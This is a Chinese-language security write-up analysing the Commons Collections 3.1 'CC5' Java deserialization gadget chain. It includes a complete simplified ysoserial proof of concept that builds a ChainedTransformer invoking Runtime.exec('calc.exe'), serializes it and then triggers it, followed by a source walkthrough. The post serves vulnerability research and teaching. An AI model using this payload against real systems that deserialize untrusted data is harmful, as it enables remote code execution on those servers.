# CommonsCollections5 （CC5链）

## 说明

### 利用链

    
    
    BadAttributeValueExpException.readObject()  
    TiedMapEntry.toString()  
      TiedMapEntry.getValue()  
         LazyMap.get()  
            ChainedTransformer.transform()  
               InvokerTransformer.transform()

### ysoserial简化后的payload

    
    
    package com.ysoserial;  
    ​  
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.keyvalue.TiedMapEntry;  
    import org.apache.commons.collections.map.LazyMap;  
    ​  
    import javax.management.BadAttributeValueExpException;  
    import java.io.*;  
    import java.lang.reflect.Field;  
    import java.util.HashMap;  
    ​  
    public class CommonCollections5 {  
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {  
    ​  
        Transformer transformer=new ChainedTransformer(new Transformer[]{  
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),  
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),  
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})  
        });  
    ​  
        LazyMap lazyMap= (LazyMap) LazyMap.decorate(new HashMap(),transformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, Runtime.class);  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  
        setFieldValue(badAttributeValueExpException,"val",tiedMapEntry);  
    ​  
    ​  
        //序列化  
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);  
        objectOutputStream.writeObject(badAttributeValueExpException);  
        byteArrayOutputStream.flush();  
        byte[] bytes = byteArrayOutputStream.toByteArray();  
    ​  
    ​  
        //反序列化  
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);  
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);  
        objectInputStream.readObject();  
    }  
    public static void setFieldValue(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException {  
        Field field1 = obj.getClass().getDeclaredField(field);  
        field1.setAccessible(true);  
        field1.set(obj,value);  
    }  
    }

### 导入依赖

    
    
    <dependency>  
    <groupId>commons-collections</groupId>  
    <artifactId>commons-collections</artifactId>  
    <version>3.1</version>  
    </dependency>

## 分析正文

CC5是一条全新的利用链，我们先来到BadAttributeValueExpException的readObject()方法

![image-20220419214006066](https://image.3001.net/images/20220420/1650435000_625fa3b8b6ef70ec0ea8c.png!small)

val是BadAttributeValueExpException自带的属性

![image-20220419214057626](https://image.3001.net/images/20220420/1650435063_625fa3f7a737a9592cca7.png!small)

所以我们可以给val赋值为TiedMapEntry，这样他就会去执行TiedMapEntry的toString方法

![1650506387_6260ba931289e671dd70e.png!small?1650506387259](https://image.3001.net/images/20220421/1650506387_6260ba931289e671dd70e.png!small?1650506387259)

然后进入getValue()

![1650506395_6260ba9b6931f7976f049.png!small?1650506395628](https://image.3001.net/images/20220421/1650506395_6260ba9b6931f7976f049.png!small?1650506395628)

map是TiedMapEntry自带的属性

![1650506403_6260baa3e89eb90b2bc0e.png!small?1650506404120](https://image.3001.net/images/20220421/1650506403_6260baa3e89eb90b2bc0e.png!small?1650506404120)

我们可以给他赋值为LazyMap，让他去触发LazyMap的get方法

![1650506409_6260baa9859a83e788541.png!small?1650506409765](https://image.3001.net/images/20220421/1650506409_6260baa9859a83e788541.png!small?1650506409765)

熟悉的LazyMap调用链，factory是LazyMap自带的属性，可以给他赋值为ChainedTransformer

![image-20220419221135943](https://image.3001.net/images/20220420/1650435430_625fa566c4a7fb5118c1c.png!small)

然后就是调用ChainedTransformer的transform方法

![1650506419_6260bab351104dde03661.png!small?1650506420136](https://image.3001.net/images/20220421/1650506419_6260bab351104dde03661.png!small?1650506420136)

然后就是依次调用InvokerTransformer的transform方法执行恶意代码了

分析结束

召唤神兽！

![1650434677_625fa2757d712a03cc6fe.png!small?1650434678597](https://image.3001.net/images/20220420/1650434677_625fa2757d712a03cc6fe.png!small?1650434678597)

